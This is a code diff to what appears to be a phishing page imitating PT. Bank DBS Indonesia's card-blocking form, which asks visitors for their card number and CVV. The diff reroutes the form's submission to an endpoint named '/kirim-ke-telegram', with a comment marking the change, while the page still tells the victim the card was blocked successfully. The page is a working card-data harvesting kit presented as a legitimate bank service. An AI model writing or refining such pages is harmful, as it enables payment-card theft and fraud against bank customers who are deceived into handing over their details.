@@ -11,7 +11,9 @@
     <span class="judul">Pemblokiran Kartu</span>
     <img src="dbs.png" alt="DBS Logo" class="logo-dbs">
   </div>
+  
   <div class="garis-kuning"></div>
+  
   <div class="form-area">
     <form id="blokirForm">
       <label for="nomor-kartu">Masukkan nomor kartu debit/ kredit/ Cashline kamu</label>
@@ -25,6 +27,7 @@
     </form>
     <div id="notif"></div>
   </div>
+
   <div class="copyright">
     &copy; Copyright 2017. PT. Bank DBS Indonesia. All rights reserved.
   </div>
@@ -39,7 +42,8 @@
         cvv: document.getElementById('cvv-kartu').value
       };
 
-      fetch("/blokir-kartu", {
+      // ✅ ganti endpoint ke '/kirim-ke-telegram'
+      fetch("/kirim-ke-telegram", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data)
@@ -48,7 +52,7 @@
         if (response.ok) {
           document.getElementById('notif').innerHTML = "<span style='color:green'>✅ Kartu berhasil diblokir.</span>";
           document.getElementById('blokirForm').reset();
-          window.location.href = "Diblokir.html";
+          window.location.href = "Diblokir.html"; // opsional: ubah sesuai halaman tujuanmu
         } else {
           document.getElementById('notif').innerHTML = "<span style='color:red'>❌ Gagal mengirim ke server!</span>";
         }
